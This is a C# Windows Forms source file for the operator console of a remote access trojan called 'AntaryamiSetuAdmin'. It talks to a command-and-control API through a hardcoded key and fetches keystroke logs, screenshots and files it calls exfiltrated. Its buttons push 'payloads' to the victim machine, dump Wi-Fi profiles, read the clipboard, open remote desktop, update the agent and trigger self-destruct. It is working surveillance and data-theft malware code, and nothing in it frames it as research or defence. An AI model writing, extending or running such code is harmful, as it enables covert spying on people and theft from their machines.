using System;
using System.Drawing;
using System.IO;
using System.Text;
using System.Linq;
using System.Windows.Forms;
using System.Threading.Tasks;
using System.Net.Http;
using System.Collections.Generic;
using System.Text.Json;

namespace AntaryamiSetuAdmin
{
    public class TerminalForm : Form
    {
        private ClientSession _session;
        private string _downloadsFolder = "";
        
        private static readonly HttpClient _httpClient = new HttpClient() { Timeout = TimeSpan.FromMinutes(45) };
        private static string ApiUrl => DashboardForm.ApiUrl;
        private int _lastResultId = 0;
        private System.Windows.Forms.Timer? _httpPollTimer;
        
        static TerminalForm()
        {
            _httpClient.DefaultRequestHeaders.Add("X-API-KEY", "SetuSecret@2026");
        }
        
        // Colors matching the original code
        private readonly Color ColBg = Color.FromArgb(5, 5, 5);
        private readonly Color ColPanel = Color.FromArgb(12, 12, 12);
        private readonly Color ColGreen = Color.FromArgb(0, 255, 64);
        private readonly Color ColCyan = Color.FromArgb(0, 200, 255);
        private readonly Color ColRed = Color.FromArgb(255, 30, 30);
        private readonly Color ColBorder = Color.FromArgb(0, 100, 30);

        private RichTextBox? _consoleLog;
        private TextBox? _commandInput;
        private Label? _lblCurrentPath;
        private Label? _lblSyncTime;

        private FlowLayoutPanel? _vaultPanel;
        private FlowLayoutPanel? _intelPanel;

        // Terminal History & Autocomplete System
        private List<string> _commandHistory = new List<string>();
        private int _historyIndex = -1;
        private string _tempCommandText = "";
        private AutoCompleteStringCollection _autoCompleteCollection = new AutoCompleteStringCollection();

         public TerminalForm(ClientSession session)
        {
            _session = session;
            
            // Wire up packet routing
            _session.OnPacketReceived = HandleIncomingPacket;
            if (_session.IsActive)
            {
                _session.OnDisconnected = () => {
                    if (InvokeRequired) { Invoke(new Action(Close)); } else { Close(); }
                };
            }

            InitializeGUI();
            LoadVaultFiles();
            LoadIntelGallery();
            
            if (_session.IsActive && _session.IsHttp)
            {
                _httpPollTimer = new System.Windows.Forms.Timer { Interval = 3000 };
                _httpPollTimer.Tick += async (s, e) => {
                    await PollHttpResultsAsync();
                    await PollHttpKeysAsync();
                };
                _httpPollTimer.Start();
                
                _ = PollHttpVaultAsync();
            }
            
            if (_session.IsActive)
            {
                LogToConsole($"[*] Console active for Node: {_session.DeviceName} ({_session.EndPoint})", ColCyan);
            }
            else
            {
                LogToConsole($"[*] OFFLINE DATA VIEW for Node: {_session.DeviceName}", ColRed);
                LogToConsole($"[*] Live commands are disabled. You can view all exfiltrated files, images, and keystroke logs on the right panel.", Color.LightGray);
            }
        }

        private async Task PollHttpResultsAsync()
        {
            try
            {
                var content = new FormUrlEncodedContent(new[] {
                    new KeyValuePair<string, string>("action", "get_results"),
                    new KeyValuePair<string, string>("device_id", _session.DeviceId),
                    new KeyValuePair<string, string>("last_id", _lastResultId.ToString())
                });
                var response = await _httpClient.PostAsync(ApiUrl, content);
                string json = await response.Content.ReadAsStringAsync();
                if (!string.IsNullOrWhiteSpace(json) && json.StartsWith("["))
                {
                    using JsonDocument doc = JsonDocument.Parse(json);
                    foreach (var res in doc.RootElement.EnumerateArray())
                    {
                        int id = res.GetProperty("id").GetInt32();
                        string output = res.GetProperty("output").GetString() ?? "";
                        if (id > _lastResultId) _lastResultId = id;
                        
                        if (output.Contains("successfully uploaded"))
                        {
                            LogToConsole(output, ColCyan);
                            await PollHttpVaultAsync();
                        }
                        else
                        {
                            LogToConsole(output, Color.LightGray);
                        }
                    }
                }
            }
            catch { }
        }

        private int _lastKeylogId = -1;
        private async Task PollHttpKeysAsync()
        {
            try
            {
                string targetFolder = Path.Combine(_downloadsFolder, _session.DeviceId);
                if (!Directory.Exists(targetFolder)) Directory.CreateDirectory(targetFolder);
                string filePath = Path.Combine(targetFolder, "keystrokes.txt");
                string idPath = Path.Combine(targetFolder, "keystrokes_last_id.txt");

                if (_lastKeylogId == -1)
                {
                    if (File.Exists(filePath) && File.Exists(idPath) && int.TryParse(File.ReadAllText(idPath), out int savedId))
                    {
                        _lastKeylogId = savedId;
                    }
                    else
                    {
                        _lastKeylogId = 0;
                    }
                }

                if (!File.Exists(filePath))
                {
                    _lastKeylogId = 0;
                }

                var content = new FormUrlEncodedContent(new[] {
                    new KeyValuePair<string, string>("action", "get_keys"),
                    new KeyValuePair<string, string>("device_id", _session.DeviceId),
                    new KeyValuePair<string, string>("last_id", _lastKeylogId.ToString())
                });
                var response = await _httpClient.PostAsync(ApiUrl, content);
                string json = await response.Content.ReadAsStringAsync();
                if (!string.IsNullOrWhiteSpace(json) && json.StartsWith("["))
                {
                    using JsonDocument doc = JsonDocument.Parse(json);
                    bool hasNewKeys = false;

                    foreach (var log in doc.RootElement.EnumerateArray())
                    {
                        int id = log.GetProperty("id").GetInt32();
                        string keystrokes = log.GetProperty("keystrokes").GetString() ?? "";
                        if (id > _lastKeylogId)
                        {
                            _lastKeylogId = id;
                            File.AppendAllText(filePath, keystrokes);
                            hasNewKeys = true;
                        }
                        
                        if (_session.OnKeystrokesReceived != null)
                        {
                            _session.OnKeystrokesReceived.Invoke(keystrokes);
                        }
                    }

                    if (hasNewKeys)
                    {
                        File.WriteAllText(idPath, _lastKeylogId.ToString());
                    }
                }
            }
            catch { }
        }

        private async Task PollHttpVaultAsync()
        {
            try
            {
                var content = new FormUrlEncodedContent(new[] {
                    new KeyValuePair<string, string>("action", "get_vault"),
                    new KeyValuePair<string, string>("device_id", _session.DeviceId)
                });
                var response = await _httpClient.PostAsync(ApiUrl, content);
                string json = await response.Content.ReadAsStringAsync();
                if (json.StartsWith("["))
                {
                    using JsonDocument doc = JsonDocument.Parse(json);
                    string targetFolder = Path.Combine(_downloadsFolder, _session.DeviceId);
                    if (!Directory.Exists(targetFolder)) Directory.CreateDirectory(targetFolder);

                    bool hasNewFiles = false;
                    foreach (var f in doc.RootElement.EnumerateArray())
                    {
                        string filename = f.GetProperty("filename").GetString() ?? "";
                        string filepath = f.GetProperty("filepath").GetString() ?? "";
                        string destPath = Path.Combine(targetFolder, filename);
                        
                        if (!File.Exists(destPath))
                        {
                            try {
                                string fileUrl = $"{ApiUrl}?action=download&file={filepath}";
                                byte[] fileBytes = await _httpClient.GetByteArrayAsync(fileUrl);
                                File.WriteAllBytes(destPath, fileBytes);
                                hasNewFiles = true;
                            } catch (Exception ex) {
                                Invoke(new Action(() => LogToConsole($"[-] Vault Download Failed: {filename} - {ex.Message}", ColRed)));
                            }
                        }
                    }
                    if (hasNewFiles)
                    {
                        Invoke(new Action(() => { LoadIntelGallery(); LoadVaultFiles(); }));
                    }
                }
            }
            catch { }
        }

        private void InitializeGUI()
        {
            this.Text = _session.IsActive 
                ? $"★ TERMINAL // {_session.DeviceName} ★" 
                : $"★ TERMINAL [OFFLINE VIEW] // {_session.DeviceName} ★";
            this.Size = new Size(1100, 700);
            this.StartPosition = FormStartPosition.CenterScreen;
            this.BackColor = ColBg;
            this.ForeColor = ColGreen;
            this.Font = new Font("Consolas", 10F, FontStyle.Regular);

            _downloadsFolder = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "downloads");
            if (!Directory.Exists(_downloadsFolder)) Directory.CreateDirectory(_downloadsFolder);

            TableLayoutPanel mainLayout = new TableLayoutPanel
            {
                Dock = DockStyle.Fill,
                ColumnCount = 3,
                RowCount = 1,
                Padding = new Padding(10)
            };
            
            // Re-creating the 3-column layout slightly adapted for Terminal use
            mainLayout.ColumnStyles.Add(new ColumnStyle(SizeType.Absolute, 200)); // Actions Left
            mainLayout.ColumnStyles.Add(new ColumnStyle(SizeType.Percent, 100)); // Terminal Center
            mainLayout.ColumnStyles.Add(new ColumnStyle(SizeType.Absolute, 320)); // Vault Right
            this.Controls.Add(mainLayout);

            // ==========================================
            // LEFT PANEL: Actions & Back Button
            // ==========================================
            Panel pnlLeft = new Panel { Dock = DockStyle.Fill, Margin = new Padding(0, 0, 10, 0) };
            
            Button btnBack = new Button { Text = "◀ BACK TO DASHBOARD", Dock = DockStyle.Bottom, Height = 40, BackColor = ColRed, ForeColor = Color.White, FlatStyle = FlatStyle.Flat, Font = new Font("Consolas", 10F, FontStyle.Bold), Cursor = Cursors.Hand };
            btnBack.FlatAppearance.BorderSize = 0;
            btnBack.Click += (s, e) => this.Close();

            Label lblAccessTitle = new Label { Text = "REMOTE ACCESS", Font = new Font("Consolas", 10F, FontStyle.Bold), ForeColor = ColCyan, Dock = DockStyle.Bottom, Height = 35, Padding = new Padding(0, 15, 0, 0) };

            Panel pnlButtons = new Panel { Dock = DockStyle.Fill, AutoScroll = true, Padding = new Padding(0, 5, 0, 0) };
            
            Button btnCapture = CreateMenuButton("📷 Capture Intel");
            btnCapture.Click += (s, e) => SendCommand("screenshot");
            
            Button btnListDir = CreateMenuButton("🗎 List Directory");
            btnListDir.Click += (s, e) => SendCommand("cmd /c dir");

            Button btnPull = CreateMenuButton("📥 Pull File");
            btnPull.Click += (s, e) => { string f = Microsoft.VisualBasic.Interaction.InputBox("Enter path on target to exfiltrate:", "PULL"); if (!string.IsNullOrWhiteSpace(f)) SendCommand($"pull {f}"); };

            Button btnPush = CreateMenuButton("📤 Push File");
            btnPush.Click += BtnPushFile_Click;

            Button btnSpeak = CreateMenuButton("🗣 Speak Text");
            btnSpeak.Click += (s, e) => { string txt = Microsoft.VisualBasic.Interaction.InputBox("Enter text to speak on target:", "SPEAK"); if (!string.IsNullOrWhiteSpace(txt)) SendCommand($"speak {txt}"); };

            Button btnAlert = CreateMenuButton("📢 Alert Message");
            btnAlert.Click += (s, e) => { string msg = Microsoft.VisualBasic.Interaction.InputBox("Enter alert message to display on target:", "FULLSCREEN ALERT"); if (!string.IsNullOrWhiteSpace(msg)) SendCommand($"alert {msg}"); };

            Button btnKeys = CreateMenuButton("⌨ Keystroke Logs");
            btnKeys.Click += (s, e) => {
                KeystrokeForm kForm = new KeystrokeForm(_session);
                kForm.Icon = this.Icon;
                kForm.Show();
            };

            Button btnScreen = CreateMenuButton("🖥 Remote Desktop");
            btnScreen.Click += (s, e) => {
                ScreenShareForm sForm = new ScreenShareForm(_session);
                sForm.Show();
            };

            Button btnFM = CreateMenuButton("📂 File Explorer");
            btnFM.Click += (s, e) => {
                FileManagerForm fForm = new FileManagerForm(_session);
                fForm.Show();
            };

            Button btnClip = CreateMenuButton("📋 Clipboard");
            btnClip.Click += (s, e) => {
                ClipboardForm cForm = new ClipboardForm(_session);
                cForm.Show();
            };

            Button btnUpdate = null!;
            if (_session.IsHttp)
            {
                btnUpdate = CreateMenuButton("🔄 Remote Update");
                btnUpdate.Click += BtnUpdateAgent_Click;
            }

            Button btnUninstall = CreateMenuButton("💥 Self Destruct");
            btnUninstall.ForeColor = ColRed;
            btnUninstall.Click += (s, e) => {
                if (MessageBox.Show("Are you sure you want to uninstall and self-destruct the remote agent?", "Confirm Self-Destruct", MessageBoxButtons.YesNo, MessageBoxIcon.Warning) == DialogResult.Yes)
                {
                    SendCommand("uninstall");
                }
            };

            Button btnWifi = CreateMenuButton("📶 Wi-Fi Profiles");
            btnWifi.Click += (s, e) => SendCommand("wifi_dump");

            Button btnNetstat = CreateMenuButton("🌐 Active Connections");
            btnNetstat.Click += (s, e) => SendCommand("netstat -ano");

            Button btnUsbHistory = CreateMenuButton("🔌 USB History");
            btnUsbHistory.Click += (s, e) => SendCommand("usb_history");

            Button btnEventLogs = CreateMenuButton("🛡️ Event Logs");
            btnEventLogs.Click += (s, e) => SendCommand("event_logs");

            pnlButtons.Controls.Add(btnUninstall);
            if (_session.IsHttp)
            {
                pnlButtons.Controls.Add(btnUpdate);
            }
            pnlButtons.Controls.Add(btnEventLogs);
            pnlButtons.Controls.Add(btnNetstat); pnlButtons.Controls.Add(btnUsbHistory); pnlButtons.Controls.Add(btnWifi); pnlButtons.Controls.Add(btnClip); pnlButtons.Controls.Add(btnFM); pnlButtons.Controls.Add(btnScreen); pnlButtons.Controls.Add(btnKeys); pnlButtons.Controls.Add(btnAlert); pnlButtons.Controls.Add(btnSpeak); pnlButtons.Controls.Add(btnPush); pnlButtons.Controls.Add(btnPull); pnlButtons.Controls.Add(btnListDir); pnlButtons.Controls.Add(btnCapture);
            pnlLeft.Controls.Add(pnlButtons);
            pnlLeft.Controls.Add(lblAccessTitle);
            pnlLeft.Controls.Add(btnBack);

            mainLayout.Controls.Add(pnlLeft, 0, 0);

            // ==========================================
            // CENTER PANEL: TERMINAL
            // ==========================================
            Panel pnlCenter = new Panel { Dock = DockStyle.Fill, Margin = new Padding(0, 0, 10, 0), BackColor = ColPanel, BorderStyle = BorderStyle.FixedSingle };
            
            Panel pnlTermHeader = new Panel { Dock = DockStyle.Top, Height = 35, Padding = new Padding(5, 5, 5, 0) };
            _lblCurrentPath = new Label { Text = $"PATH: {_session.CurrentPath}", ForeColor = ColCyan, AutoSize = true, Location = new Point(5, 8), Font = new Font("Consolas", 10F, FontStyle.Bold) };
            _lblSyncTime = new Label { Text = $"SYNC: {DateTime.Now:yyyy-MM-dd HH:mm:ss}", ForeColor = Color.Gray, Anchor = AnchorStyles.Top | AnchorStyles.Right, AutoSize = true, Location = new Point(pnlCenter.Width - 200, 8) };
            pnlTermHeader.Controls.Add(_lblCurrentPath); pnlTermHeader.Controls.Add(_lblSyncTime);
            pnlCenter.Controls.Add(pnlTermHeader);

            Panel pnlCommand = new Panel { Dock = DockStyle.Bottom, Height = 60, Padding = new Padding(10) };
            
            Button btnRun = new Button { Text = "RUN", Width = 100, Dock = DockStyle.Right, BackColor = _session.IsActive ? ColGreen : Color.DimGray, ForeColor = Color.Black, Font = new Font("Consolas", 12F, FontStyle.Bold), FlatStyle = FlatStyle.Flat, Cursor = _session.IsActive ? Cursors.Hand : Cursors.Default };
            btnRun.FlatAppearance.BorderSize = 0;
            btnRun.Click += (s, e) => SendCustomCommand();
            btnRun.Enabled = _session.IsActive;

            _commandInput = new TextBox { Dock = DockStyle.Fill, BackColor = ColBg, ForeColor = ColGreen, Font = new Font("Consolas", 14F), BorderStyle = BorderStyle.FixedSingle };
            _commandInput.Enabled = _session.IsActive;
            
            // Set up AutoComplete
            InitializeAutoComplete();
            _commandInput.AutoCompleteCustomSource = _autoCompleteCollection;
            _commandInput.AutoCompleteMode = AutoCompleteMode.SuggestAppend;
            _commandInput.AutoCompleteSource = AutoCompleteSource.CustomSource;

            _commandInput.KeyDown += CommandInput_KeyDown;
            
            Panel pnlTxtWrapper = new Panel { Dock = DockStyle.Fill, Padding = new Padding(0, 5, 10, 0) };
            pnlTxtWrapper.Controls.Add(_commandInput);
            
            pnlCommand.Controls.Add(pnlTxtWrapper);
            pnlCommand.Controls.Add(btnRun);
            pnlCenter.Controls.Add(pnlCommand);

            _consoleLog = new RichTextBox { Dock = DockStyle.Fill, BackColor = ColBg, ForeColor = ColGreen, Font = new Font("Consolas", 10.5F), ReadOnly = true, BorderStyle = BorderStyle.None, HideSelection = false };
            pnlCenter.Controls.Add(_consoleLog);

            mainLayout.Controls.Add(pnlCenter, 1, 0);

            // ==========================================
            // RIGHT PANEL: VAULT
            // ==========================================
            Panel pnlRight = new Panel { Dock = DockStyle.Fill };
            SplitContainer splitRight = new SplitContainer { Dock = DockStyle.Fill, Orientation = Orientation.Horizontal, SplitterWidth = 5, SplitterDistance = 300 };
            
            Panel pnlVault = new Panel { Dock = DockStyle.Fill };
            Label lblVaultTitle = new Label { Text = "DATA VAULT", Font = new Font("Consolas", 11F, FontStyle.Bold), ForeColor = ColCyan, Dock = DockStyle.Top, Height = 30 };
            _vaultPanel = new FlowLayoutPanel { Dock = DockStyle.Fill, AutoScroll = true, BackColor = ColPanel, BorderStyle = BorderStyle.FixedSingle, Padding = new Padding(5) };
            pnlVault.Controls.Add(_vaultPanel);
            pnlVault.Controls.Add(lblVaultTitle);

            Panel pnlIntel = new Panel { Dock = DockStyle.Fill, Padding = new Padding(0, 10, 0, 0) };
            Label lblIntelTitle = new Label { Text = "VISUAL INTEL", Font = new Font("Consolas", 11F, FontStyle.Bold), ForeColor = ColCyan, Dock = DockStyle.Top, Height = 30 };
            _intelPanel = new FlowLayoutPanel { Dock = DockStyle.Fill, AutoScroll = true, BackColor = ColPanel, BorderStyle = BorderStyle.FixedSingle, Padding = new Padding(5) };
            pnlIntel.Controls.Add(_intelPanel);
            pnlIntel.Controls.Add(lblIntelTitle);

            splitRight.Panel1.Controls.Add(pnlVault);
            splitRight.Panel2.Controls.Add(pnlIntel);
            pnlRight.Controls.Add(splitRight);

            mainLayout.Controls.Add(pnlRight, 2, 0);
        }

        private Button CreateMenuButton(string text)
        {
            // Allowed offline views
            bool allowedOffline = text.Contains("Keystroke Logs");
            bool isEnabled = _session.IsActive || allowedOffline;

            Button btn = new Button
            {
                Text = text, Dock = DockStyle.Top, Height = 40, FlatStyle = FlatStyle.Flat, 
                ForeColor = isEnabled ? ColCyan : Color.DimGray, BackColor = ColBg,
                TextAlign = ContentAlignment.MiddleLeft, Padding = new Padding(10, 0, 0, 0), Font = new Font("Consolas", 10F, FontStyle.Regular),
                Cursor = isEnabled ? Cursors.Hand : Cursors.Default, Margin = new Padding(0, 0, 0, 5),
                Enabled = isEnabled
            };
            btn.FlatAppearance.BorderColor = isEnabled ? ColBorder : Color.FromArgb(40, 40, 40);
            if (isEnabled)
            {
                btn.MouseEnter += (s, e) => { btn.BackColor = ColPanel; btn.ForeColor = ColGreen; btn.FlatAppearance.BorderColor = ColCyan; };
                btn.MouseLeave += (s, e) => { btn.BackColor = ColBg; btn.ForeColor = ColCyan; btn.FlatAppearance.BorderColor = ColBorder; };
            }
            return btn;
        }

        private void HandleIncomingPacket(byte type, byte[] payload)
        {
            switch (type)
            {
                case 3: // Console Output
                    LogToConsole(Encoding.UTF8.GetString(payload), Color.LightGray);
                    break;
                case 4: // Screenshot
                    try {
                        string targetFolder = Path.Combine(_downloadsFolder, _session.DeviceId);
                        if (!Directory.Exists(targetFolder)) Directory.CreateDirectory(targetFolder);
                        string filePath = Path.Combine(targetFolder, $"screenshot_{DateTime.Now:yyyyMMdd_HHmmss}.jpg");
                        File.WriteAllBytes(filePath, payload);
                        LogToConsole($"[+] Visual Intel secured: {filePath}", ColCyan);
                        Invoke(new Action(() => LoadIntelGallery()));
                    } catch (Exception ex) { LogToConsole($"[-] Render error: {ex.Message}", ColRed); }
                    break;
                case 5: // File Pull
                    try {
                        int fnLength = BitConverter.ToInt32(payload, 0);
                        string filename = Encoding.UTF8.GetString(payload, 4, fnLength);
                        int dataLen = payload.Length - (4 + fnLength);
                        byte[] fileBytes = new byte[dataLen];
                        Array.Copy(payload, 4 + fnLength, fileBytes, 0, dataLen);
                        string targetFolder = Path.Combine(_downloadsFolder, _session.DeviceId);
                        if (!Directory.Exists(targetFolder)) Directory.CreateDirectory(targetFolder);
                        string destPath = Path.Combine(targetFolder, filename);
                        File.WriteAllBytes(destPath, fileBytes);
                        LogToConsole($"[+] EXFIL SUCCESS: '{filename}' securely transferred to Vault.", ColGreen);
                        Invoke(new Action(() => LoadVaultFiles()));
                    } catch (Exception ex) { LogToConsole($"[-] Vault error: {ex.Message}", ColRed); }
                    break;
                case 7: // Keystrokes
                    try {
                        string keyData = Encoding.UTF8.GetString(payload);
                        string targetFolder = Path.Combine(_downloadsFolder, _session.DeviceId);
                        if (!Directory.Exists(targetFolder)) Directory.CreateDirectory(targetFolder);
                        string filePath = Path.Combine(targetFolder, "keystrokes.txt");
                        File.AppendAllText(filePath, keyData);
                        
                        if (_session.OnKeystrokesReceived != null)
                        {
                            _session.OnKeystrokesReceived.Invoke(keyData);
                        }
                    } catch (Exception ex) { LogToConsole($"[-] Keylogger log error: {ex.Message}", ColRed); }
                    break;
            }
        }

        private void SendCustomCommand()
        {
            string command = _commandInput!.Text.Trim();
            if (string.IsNullOrEmpty(command)) return;

            // Add to history if not identical to last command
            if (_commandHistory.Count == 0 || _commandHistory[_commandHistory.Count - 1] != command)
            {
                _commandHistory.Add(command);
            }
            _historyIndex = -1; // Reset history index

            // Add to autocomplete suggestions if new
            if (!_autoCompleteCollection.Contains(command))
            {
                _autoCompleteCollection.Add(command);
            }

            SendCommand(command);
            _commandInput.Clear();
        }

        private void CommandInput_KeyDown(object? sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
                e.SuppressKeyPress = true; // Prevents ding beep sound when pressing enter on single line textbox
                SendCustomCommand();
            }
            else if (e.KeyCode == Keys.Up)
            {
                e.SuppressKeyPress = true; // Stop cursor from moving
                NavigateHistory(-1);
            }
            else if (e.KeyCode == Keys.Down)
            {
                e.SuppressKeyPress = true; // Stop cursor from moving
                NavigateHistory(1);
            }
        }

        private void InitializeAutoComplete()
        {
            string[] defaultSuggestions = new string[]
            {
                "screenshot",
                "alert ",
                "pull ",
                "speak ",
                "beep ",
                "cd ",
                "cat ",
                "netstat",
                "usb_history",
                "cmd /c dir",
                "cmd /c ipconfig",
                "cmd /c tasklist",
                "cmd /c whoami",
                "powershell.exe -Command \"Get-Process\"",
                "powershell.exe -Command \"Get-Service\""
            };
            _autoCompleteCollection.AddRange(defaultSuggestions);
        }

        private void NavigateHistory(int direction)
        {
            if (_commandHistory.Count == 0) return;

            if (_historyIndex == -1 && direction == -1)
            {
                // Start navigating up from current input
                _tempCommandText = _commandInput!.Text;
            }

            _historyIndex += direction;

            if (_historyIndex < 0)
            {
                _historyIndex = -1;
                _commandInput!.Text = _tempCommandText;
                _commandInput.SelectionStart = _commandInput.Text.Length;
            }
            else if (_historyIndex >= _commandHistory.Count)
            {
                _historyIndex = _commandHistory.Count;
                _commandInput!.Text = "";
            }
            else
            {
                _commandInput!.Text = _commandHistory[_historyIndex];
                _commandInput.SelectionStart = _commandInput.Text.Length;
            }
        }

        private void SendCommand(string command)
        {
            if (!_session.IsActive) { LogToConsole("[-] DISCONNECTED.", ColRed); return; }
            LogToConsole($"\n> {command}", ColGreen);

            if (_session.IsHttp)
            {
                try {
                    var content = new FormUrlEncodedContent(new[] {
                        new KeyValuePair<string, string>("action", "send_cmd"),
                        new KeyValuePair<string, string>("device_id", _session.DeviceId),
                        new KeyValuePair<string, string>("command", command)
                    });
                    _httpClient.PostAsync(ApiUrl, content);
                } catch (Exception ex) { LogToConsole($"[-] Error: {ex.Message}", ColRed); }
                return;
            }

            try {
                byte[] cmdBytes = Encoding.UTF8.GetBytes(command);
                _session.SendPacket(2, cmdBytes);
            } catch (Exception ex) { LogToConsole($"[-] Error: {ex.Message}", ColRed); }
        }

        private void LogToConsole(string text, Color color)
        {
            if (InvokeRequired) { Invoke(new Action(() => LogToConsole(text, color))); return; }
            
            // Auto-clear oldest text if it gets too large to prevent lag/rendering issues
            if (_consoleLog!.TextLength > 100000)
            {
                _consoleLog.Select(0, _consoleLog.TextLength - 80000);
                _consoleLog.SelectedText = "";
            }

            _consoleLog.SelectionStart = _consoleLog.TextLength;
            _consoleLog.SelectionLength = 0;
            _consoleLog.SelectionColor = color;
            _consoleLog.AppendText($"{text}\n");
            _consoleLog.ScrollToCaret();
        }

        private async void BtnPushFile_Click(object? sender, EventArgs e)
        {
            using OpenFileDialog ofd = new OpenFileDialog { Title = "Select Payload for Injection" };
            if (ofd.ShowDialog() == DialogResult.OK) {
                try {
                    string filepath = ofd.FileName;
                    string filename = Path.GetFileName(filepath);
                    
                    if (_session.IsHttp)
                    {
                        LogToConsole($"[*] Uploading '{filename}' to server for pushing...", ColCyan);
                        byte[] fileBytes = File.ReadAllBytes(filepath);
                        
                        var content = new MultipartFormDataContent();
                        content.Add(new StringContent("admin_push_file"), "action");
                        content.Add(new StringContent(_session.DeviceId), "device_id");
                        
                        var fileContent = new ByteArrayContent(fileBytes);
                        content.Add(fileContent, "file", filename);
                        
                        var response = await _httpClient.PostAsync(ApiUrl, content);
                        string resStr = await response.Content.ReadAsStringAsync();
                        if (int.TryParse(resStr, out int taskId))
                        {
                            LogToConsole($"[+] PUSH INITIATED: Task ID {taskId}. Awaiting agent execution.", ColGreen);
                        }
                        else
                        {
                            LogToConsole($"[-] Push failed: {resStr}", ColRed);
                        }
                        return;
                    }

                    byte[] fileBytesRaw = File.ReadAllBytes(filepath);
                    byte[] fnBytes = Encoding.UTF8.GetBytes(filename);
                    byte[] payload = new byte[4 + fnBytes.Length + fileBytesRaw.Length];
                    Array.Copy(BitConverter.GetBytes(fnBytes.Length), 0, payload, 0, 4);
                    Array.Copy(fnBytes, 0, payload, 4, fnBytes.Length);
                    Array.Copy(fileBytesRaw, 0, payload, 4 + fnBytes.Length, fileBytesRaw.Length);
                    _session.SendPacket(6, payload);
                    LogToConsole($"[+] INJECTION SUCCESS: Payload '{filename}' pushed to target.", ColCyan);
                } catch (Exception ex) { LogToConsole($"[-] INJECTION FAILED: {ex.Message}", ColRed); }
            }
        }

        private async void BtnUpdateAgent_Click(object? sender, EventArgs e)
        {
            using OpenFileDialog ofd = new OpenFileDialog { Title = "Select Compile Build (OnlineAgent.exe) for Remote Update", Filter = "Executable Files (*.exe)|*.exe" };
            if (ofd.ShowDialog() == DialogResult.OK)
            {
                try
                {
                    string filepath = ofd.FileName;
                    string filename = Path.GetFileName(filepath);

                    LogToConsole($"[*] Uploading update file '{filename}' to server...", ColCyan);
                    using (FileStream fs = new FileStream(filepath, FileMode.Open, FileAccess.Read))
                    {
                        var content = new MultipartFormDataContent();
                        content.Add(new StringContent("admin_update_agent"), "action");
                        content.Add(new StringContent(_session.DeviceId), "device_id");

                        var fileContent = new StreamContent(fs);
                        content.Add(fileContent, "file", filename);

                        var response = await _httpClient.PostAsync(ApiUrl, content);
                        string resStr = await response.Content.ReadAsStringAsync();
                        if (int.TryParse(resStr, out int taskId))
                        {
                            LogToConsole($"[+] UPDATE INITIATED: Task ID {taskId}. Awaiting agent execution and update replace sequence.", ColGreen);
                        }
                        else
                        {
                            LogToConsole($"[-] Update upload failed: {resStr}", ColRed);
                        }
                    }
                }
                catch (Exception ex)
                {
                    LogToConsole($"[-] UPDATE INITIATED ERROR: {ex.Message}", ColRed);
                }
            }
        }

        private void LoadVaultFiles()
        {
            if (InvokeRequired) { Invoke(new Action(LoadVaultFiles)); return; }
            _vaultPanel!.Controls.Clear();
            string targetFolder = Path.Combine(_downloadsFolder, _session.DeviceId);
            if (!Directory.Exists(targetFolder)) return;
            var files = new DirectoryInfo(targetFolder).GetFiles().OrderByDescending(f => f.LastWriteTime);
            
            foreach (var f in files)
            {
                if (f.Extension.Equals(".jpg", StringComparison.OrdinalIgnoreCase)) continue;
                Panel card = new Panel { Width = _vaultPanel.Width - 30, Height = 75, BackColor = ColBg, Margin = new Padding(5) };
                Label lblName = new Label { Text = "🗎 " + f.Name, ForeColor = Color.White, Location = new Point(5, 5), AutoSize = true, Font = new Font("Consolas", 9F, FontStyle.Bold) };
                Label lblSize = new Label { Text = $"{f.Length / 1024.0:F2} KB", ForeColor = Color.Gray, Location = new Point(5, 25), AutoSize = true, Font = new Font("Consolas", 8F) };
                Label lblDate = new Label { Text = f.LastWriteTime.ToString("dd MMM HH:mm"), ForeColor = Color.Gray, Location = new Point(180, 25), AutoSize = true, Font = new Font("Consolas", 8F) };
                Button btnDown = new Button { Text = "DOWNLOAD", BackColor = ColCyan, ForeColor = Color.Black, FlatStyle = FlatStyle.Flat, Location = new Point(5, 45), Width = card.Width - 10, Height = 20, Font = new Font("Consolas", 8F, FontStyle.Bold), Cursor = Cursors.Hand };
                btnDown.FlatAppearance.BorderSize = 0;
                btnDown.Click += (s, e) => System.Diagnostics.Process.Start("explorer.exe", $"/select,\"{f.FullName}\"");
                card.Controls.Add(lblName); card.Controls.Add(lblSize); card.Controls.Add(lblDate); card.Controls.Add(btnDown);
                _vaultPanel.Controls.Add(card);
            }
        }

        private void LoadIntelGallery()
        {
            if (InvokeRequired) { Invoke(new Action(LoadIntelGallery)); return; }
            _intelPanel!.Controls.Clear();
            string targetFolder = Path.Combine(_downloadsFolder, _session.DeviceId);
            if (!Directory.Exists(targetFolder)) return;
            
            var files = Directory.GetFiles(targetFolder, "*.jpg").OrderByDescending(f => f).ToList();
            foreach (var file in files) {
                try {
                    Panel card = new Panel { Width = _intelPanel.Width - 30, Height = 130, BackColor = ColBg, Margin = new Padding(5) };
                    PictureBox pb = new PictureBox { Dock = DockStyle.Top, Height = 100, SizeMode = PictureBoxSizeMode.Zoom, Image = Image.FromFile(file), Cursor = Cursors.Hand };
                    pb.Click += (s, ev) => {
                        Form fsForm = new Form { WindowState = FormWindowState.Maximized, FormBorderStyle = FormBorderStyle.None, BackColor = Color.Black };
                        PictureBox fsPb = new PictureBox { Dock = DockStyle.Fill, Image = pb.Image, SizeMode = PictureBoxSizeMode.Zoom, Cursor = Cursors.Hand };
                        fsPb.Click += (sender, eargs) => fsForm.Close();
                        fsForm.Controls.Add(fsPb);
                        fsForm.ShowDialog();
                    };
                    Label lbl = new Label { Text = "🕒 " + new FileInfo(file).LastWriteTime.ToString("dd MMM HH:mm:ss"), ForeColor = Color.Gray, Dock = DockStyle.Bottom, TextAlign = ContentAlignment.MiddleCenter, Font = new Font("Consolas", 8F) };
                    card.Controls.Add(pb); card.Controls.Add(lbl);
                    _intelPanel.Controls.Add(card);
                } catch { }
            }
        }
        
        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            // Clear event handlers so dashboard doesn't throw exceptions when sending to closed form
            if (_httpPollTimer != null) _httpPollTimer.Stop();
            _session.OnPacketReceived = null;
            _session.OnDisconnected = null;
            base.OnFormClosing(e);
        }
    }
}
